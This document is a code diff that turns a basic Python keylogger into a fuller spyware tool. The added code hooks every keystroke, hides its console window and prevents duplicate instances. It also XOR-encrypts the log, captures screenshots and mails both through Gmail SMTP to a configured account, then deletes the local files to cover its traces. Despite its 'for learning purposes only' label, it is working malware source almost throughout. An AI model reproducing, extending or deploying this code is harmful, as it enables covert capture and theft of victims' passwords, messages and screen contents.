@@ -2,100 +2,192 @@
 ## For learning porpuses only
 
 import pyHook, pythoncom
-import win32event, win32api, winerror
+import autopy
 import threading
 import os.path
+import os
+import smtplib
+import email
+import time
+from email.MIMEMultipart import MIMEMultipart
+from email.Utils import COMMASPACE
+from email.MIMEBase import MIMEBase
+from email.parser import Parser
+from email.MIMEImage import MIMEImage
+from email.MIMEText import MIMEText
+from email.MIMEAudio import MIMEAudio
+import mimetypes
+import win32event, win32api, winerror
 
-# Write an encrypted file with the pressed keys
-def WriteToFileEn(): 
-    file = open(Pressed.path, "a")
-    file.write(xor(Pressed.i, Pressed.key))
+
+
+#Email details for sending the keylogger (default: GMAIL)
+class Email:
+    username = 'YourEmail@gmail.com'
+    password = 'YourPassword'
+    server = "smtp.gmail.com"
+    smtp_port = 465
+    From = username
+    tolist = username.split()
+    To = email.Utils.COMMASPACE.join(username)
+    Subject = "This is keylogger"
+    Message = email.MIMEMultipart.MIMEMultipart()
+    Message['From'] = From
+    Message['To'] = email.Utils.COMMASPACE.join(tolist)
+    Message['Subject'] = Subject
+    
+#Contains all necessary things for the keylogger to work    
+class Keylogger:
+    i = ''      #The strings inserted here
+    key = "password"    #The key that the log file is encrypted with
+    log_path = os.path.join("C:/", "Keylogger/", "keylogger.txt")    #the path to save the log file (deleted afterwards)
+    screenshot_path = os.path.join("C:/", "Keylogger/", "screenshot.png")    #The path to save the screenshot image (deleted afterwards)
+    MAX_KEYSTROKES = 100    #In which length the log file should be sent
+
+#Allows the keylogger to run at the background
+class myThread (threading.Thread):
+    def __init__(self, threadID, name, counter):
+        threading.Thread.__init__(self)
+        self.threadID = threadID
+        self.name = name
+        self.counter = counter
+    def run(self):
+        main()
+
+#Disallowing multiple instances of the keylogger
+def disallow_Multiple_Instances():
+    mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
+    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+        mutex = None
+        exit(0)
+    x=''
+    data=''
+    count=0
+
+# Write an encrypted file with the Keylogger keys
+def writeToFile(): 
+    file = open(Keylogger.log_path, "a")
+    file.write(xor(Keylogger.i, Keylogger.key))
     file.close()
-
-def WriteToFileDe(): 
-    file = open(Pressed.new_path, "a")
-    file.write(DecryptFile())
-    file.close()
-
-def KeyFilters(event):
-    if (event.KeyID is 13):
-        Pressed.i += ' [Enter] '
-    elif (event.KeyID is 162 or event.KeyID is 163):
-        Pressed.i += ' [CTRL] '
-    elif (event.KeyID is 164 or event.KeyID is 165):
-        Pressed.i += ' [ALT] '
-    elif (event.KeyID is 8):
-        Pressed.i += ' [BackSpace] '
-    elif (event.KeyID is 160 or event.KeyID is 161):
-        Pressed.i += ' [SHIFT] '
-    elif (event.KeyID is 46):
-        Pressed.i += ' [Delete] '
-    elif (event.KeyID is 32):
-        Pressed.i += ' [Space] '
-    elif (event.KeyID is 27):
-        Pressed.i += ' [Escape] '
-    elif (event.KeyID is 9):
-        Pressed.i += ' [TAB] '
-    elif (event.KeyID is 20):
-        Pressed.i += ' [CapsLock] '
-    elif (event.KeyID is 38):
-        Pressed.i += ' [Up] '
-    elif (event.KeyID is 40):
-        Pressed.i += ' [Down] '
-    elif (event.KeyID is 37):
-        Pressed.i += ' [Left] '
-    elif (event.KeyID is 91):
-        Pressed.i += ' [Windows] '
-    else:
-        Pressed.i += chr(event.Ascii)
-    Pressed.count += 1
     return True
 
-def xor(data, key): ##XOR Algorithm
+#Deleting traces of the file with the hooked keys and the screenshot
+def DeleteFiles():
+    os.remove(Keylogger.log_path)
+    os.remove(Keylogger.screenshot_path)
+    return True
+
+#Sending The Hooked keys to email and then deleting the attached files and resetting the message at the Email class
+def send_Email():
+    file = open(Keylogger.log_path, "r")
+    str = file.read()
+    file.close()
+    Email.Message.attach(MIMEText(xor(str, Keylogger.key)))
+    Email.Message.attach(MIMEImage(open(Keylogger.screenshot_path, 'rb').read()))
+    try:
+        server_ssl = smtplib.SMTP_SSL()
+        server_ssl.connect(Email.server, Email.smtp_port)
+        server_ssl.ehlo()
+        server_ssl.login(Email.username, Email.password)
+        server_ssl.sendmail(Email.From, Email.tolist, Email.Message.as_string())
+        server_ssl.quit()
+        server_ssl.close()
+        print 'succesfully sent email'
+    except:
+        print 'failed to send email'
+    DeleteFiles()
+    Email.Message = email.MIMEMultipart.MIMEMultipart()
+
+#Taking screenshot and saving it to the location defined in the Keylogger class
+def take_screenshot():
+    bitmap = autopy.bitmap.capture_screen()
+    bitmap.save(Keylogger.screenshot_path)
+    
+
+#Filtering Keystrokes to cases
+def KeyFilters(event):
+    if (event.KeyID is 13):
+        Keylogger.i += ' [Enter] '
+    elif (event.KeyID is 162 or event.KeyID is 163):
+        Keylogger.i += ' [CTRL] '
+    elif (event.KeyID is 164 or event.KeyID is 165):
+        Keylogger.i += ' [ALT] '
+    elif (event.KeyID is 8):
+        Keylogger.i += ' [BackSpace] '
+    elif (event.KeyID is 160 or event.KeyID is 161):
+        Keylogger.i += ' [SHIFT] '
+    elif (event.KeyID is 46):
+        Keylogger.i += ' [Delete] '
+    elif (event.KeyID is 32):
+        Keylogger.i += ' [Space] '
+    elif (event.KeyID is 27):
+        Keylogger.i += ' [Escape] '
+    elif (event.KeyID is 9):
+        Keylogger.i += ' [TAB] '
+    elif (event.KeyID is 20):
+        Keylogger.i += ' [CapsLock] '
+    elif (event.KeyID is 38):
+        Keylogger.i += ' [Up] '
+    elif (event.KeyID is 40):
+        Keylogger.i += ' [Down] '
+    elif (event.KeyID is 37):
+        Keylogger.i += ' [Left] '
+    elif (event.KeyID is 91):
+        Keylogger.i += ' [Windows] '
+    else:
+        Keylogger.i += chr(event.Ascii)
+    return True
+
+#XOR Encryption Algorithm
+def xor(data, key):
     output = ""
     for i, character in enumerate(data):
         output += chr(ord(character) ^ ord(key[i % len(key)]))
-    return output 
+    return output
 
-def DecryptFile():
-    file = open(Pressed.path, "r")
-    str = file.read()
-    return (xor(str, Pressed.key))  ##need to add function call that writes the decrypted file
+#Initializing variables and objects for the next round
+def initialize():
+    hm.UnhookKeyboard()
+    Keylogger.i = None
+    Keylogger.i = ''
+    hm.HookKeyboard()
 
-class Pressed:
-    i = ''
-    count = 0
-    key = "password"
-    path = os.path.join("C:/", "Keylogger/", "keylogger.txt")
-    new_path = os.path.join("C:/", "Keylogger/", "keylogger_new.txt")
-    
+#Writing keystrokes to a file, taking screenshot and sending it to email <- only after the log file reached it's max length
+def sending_procedure():
+    if len(Keylogger.i) > Keylogger.MAX_KEYSTROKES:
+        writeToFile()
+        take_screenshot()
+        send_Email()
+        initialize()
 
-
+#Keystrokes listener
 def OnKeyboardEvent(event):
-##    print 'MessageName:',event.MessageName
-##    print 'Message:',event.Message
-##    print 'Time:',event.Time
-##    print 'Window:',event.Window
-##    print 'WindowName:',event.WindowName
-##    print 'Ascii:', event.Ascii, chr(event.Ascii)
-##    print 'Key:', event.Key
-##    print 'KeyID:', event.KeyID
-##    print 'ScanCode:', event.ScanCode
-##    print 'Extended:', event.Extended
-##    print 'Injected:', event.Injected
-##    print 'Alt', event.Alt
-##    print 'Transition', event.Transition
-##    print '---'
     KeyFilters(event)
-    if (Pressed.count > 20):
-        WriteToFileEn()
-        WriteToFileDe()
-        Pressed.count = 0
-        Pressed.i = ''
+    sending_procedure()
+
+#hiding console
+def hide():
+    import win32console,win32gui
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window,0)
     return True
 
+#running the keylogger
+def main():
+    hm.KeyDown = OnKeyboardEvent
+    hm.HookKeyboard()
+    pythoncom.PumpMessages()
 
+hide()
 hm = pyHook.HookManager()
-hm.KeyDown = OnKeyboardEvent
-hm.HookKeyboard()
-pythoncom.PumpMessages()
+disallow_Multiple_Instances()
+thread = myThread(1, "Thread", 1)
+thread.start()
+
+
+
+
+
+    
+    
+
